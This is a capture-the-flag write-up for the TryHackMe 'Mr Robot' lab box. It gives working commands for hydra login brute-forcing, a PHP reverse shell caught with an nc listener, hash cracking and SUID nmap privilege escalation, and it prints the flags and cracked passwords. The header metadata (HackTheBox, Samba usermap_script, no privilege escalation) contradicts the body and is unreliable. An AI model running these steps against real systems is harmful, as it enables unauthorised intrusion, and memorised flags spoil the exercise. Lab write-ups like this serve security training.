---
title: "TryHackMe — Mr Robot"
date: "2025-10-05"
tags: ["TryHackMe", "Linux", "Easy"]
category: "writeup"
platform: "HackTheBox"
difficulty: "Easy"
excerpt: "Classic starter box. Samba usermap_script vulnerability for a direct root shell. No privilege escalation needed."
---

## Box Info

| Field | Value |
|-------|-------|
| OS | Linux |
| Difficulty | Easy |
| IP | 10.201.73.58 |

## Reconnaissance

### Nmap

```bash
nmap -A -T4 10.201.73.58
```

```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:e2:2b:2d:06:a1:79:fd:14:6b:52:c6:61:3b:6b:cf (RSA)
|   256 8a:0f:39:cb:50:4f:0d:31:2e:ab:63:7c:a0:e6:2d:7e (ECDSA)
|_  256 6c:9a:ee:13:9c:ce:e4:6a:8e:7c:c6:81:d0:6f:df:d4 (ED25519)
80/tcp  open  http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open  ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.4 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration
Open the site in browser. Manual check helps find obvious files before using tools.
`/robots.txt`

You found:

- First key
- A wordlist: fsocity.dic

The first key is: 

```code
073403c8a58a1f80d943455fb30724b9
```

Download the wordlist. We’ll use it later for brute force.

### Directory Brute Force (Gobuster)

```bash
gobuster dir -u "http://10.201.73.58" -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
```bash
/blog                 (Status: 301) [Size: 233] [--> http://10.201.73.58/blog/]
/login                (Status: 302) [Size: 0] [--> http://10.201.73.58/wp-login.php]
/wp-content           (Status: 301) [Size: 239] [--> http://10.201.73.58/wp-content/]
/admin                (Status: 301) [Size: 234] [--> http://10.201.73.58/admin/]
/wp-login             (Status: 200) [Size: 2606]
/wp-admin             (Status: 301) [Size: 237] [--> http://10.201.73.58/wp-admin/] 
```

### Username Enumeration
When you try login with random creds site gives error with valuable information:

```code
ERROR: Invalid username.
```

You can use it for brute force username and find correct one. We can use `hydra` or `ffuf`. For best usage of `fsocity.dic` `sort` and `uniq` the file.

```bash
$ sort fsocity.dic -u | uniq -u > fsocity.txt

$ ls -la
total 7184
drwxrwxr-x 2 kali kali    4096 Oct  5 10:53 .
drwxrwxr-x 6 kali kali    4096 Oct  4 21:52 ..
-rw-rw-r-- 1 kali kali 7245381 Oct  5 10:53 fsocity.dic
-rw-rw-r-- 1 kali kali   96747 Oct  5 10:53 fsocity.txt
```

We need exact POST format for brute force. We can capture login request with Burp Suite:

```code
log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.201.73.58%2Fwp-admin%2F&testcookie=1
```

### Username Brute Force (Hydra)

```bash
hydra -L fsocity.txt -p test 10.201.73.58 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-05 11:08:59
[80][http-post-form] host: 10.201.73.58   login: elliot   password: test
[80][http-post-form] host: 10.201.73.58   login: ELLIOT   password: test
[80][http-post-form] host: 10.201.73.58   login: Elliot   password: test
```

We got the username: elliot. We can use same method with password list. We found correct password:

```code
ER28-0652
```

### WordPress Access

Login to /wp-admin.

![image.png](/posts/writeups/thm/mr-robot/thm-mr-robot-wp-admin-page.png)

### Reverse Shell via Theme Editor

You modified a PHP file and added reverse shell.
Used:
- php-reverse-shell (pentestmonkey)

![reverse-shell.png](/posts/writeups/thm/mr-robot/thm-nr-robot-404-reverse-shell.png)

Start listener:

```bash
nc -lvnp 4444
listening on [any] 4444 ...

connect to [10.21.137.206] from (UNKNOWN) [10.201.73.58] 59904
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
Trigger the shell → you get access.

### Local Enumeration

We found `robot` user and hash paswword of `robot` user. 

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
daemon@ip-10-201-73-58:/$ cd /home
cd /home
daemon@ip-10-201-73-58:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root   root   4096 Jun  2 18:14 .
drwxr-xr-x 23 root   root   4096 Oct  5 06:11 ..
drwxr-xr-x  2 root   root   4096 Nov 13  2015 robot
drwxr-xr-x  4 ubuntu ubuntu 4096 Jun  2 18:16 ubuntu
daemon@ip-10-201-73-58:/home$ cd robot && ls -la
cd robot && ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 4 root  root  4096 Jun  2 18:14 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
daemon@ip-10-201-73-58:/home/robot$ more key-2-of-3.txt
more key-2-of-3.txt
more: cannot open key-2-of-3.txt: Permission denied
daemon@ip-10-201-73-58:/home/robot$ more password.raw-md5
more password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@ip-10-201-73-58:/home/robot$
```

We can crack it and switch to robot to get second key. I cracked the password easily with crackstation.net. Password is `abcdefghijklmnopqrstuvwxyz`.

```bash
daemon@ip-10-201-73-58:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

$ pwd 
pwd
/home/robot
$ more key-2-of-3.txt
more key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

We got second key: `822c73956184f694993bede3eb39f959`. 
Now it is time to became root. When I look for files with SUID I got nmap. 
We can use it for privilege escalation.

```bash
$ find / -user root -perm /4000 2>/dev/null
find / -user root -perm /4000 2>/dev/null

/usr/local/bin/nmap

```

### Privilege Escelation

Note:
This works only on old versions of nmap

```bash
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> whoami
whoami
root
nmap> ls -la /root
ls -la /root
total 44
drwx------  7 root root 4096 Jun  2 18:26 .
drwxr-xr-x 23 root root 4096 Oct  5 06:11 ..
-rw-------  1 root root    0 Jun  2 18:26 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  3 root root 4096 May 29 15:36 .cache
drwx------  3 root root 4096 May 29 15:36 .config
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
drwx------  3 root root 4096 May 29 16:58 .gnupg
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
drwxr-xr-x  3 root root 4096 May 29 17:26 .local
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
drwx------  2 root root 4096 May 29 15:20 .ssh
-rw-------  1 root root    0 Jun  2 18:26 .viminfo
nmap> more /root/key-3-of-3.txt
more /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

Get Root Flag:

```code
04787ddef27c3dee1ee161b21670b4e4
```

#### Summary
- Web enumeration → robots.txt → wordlist + key
- WordPress discovered
- Username brute force → elliot
- Password brute force → ER28-0652
- Admin access → reverse shell
- Hash crack → robot user
- SUID nmap → root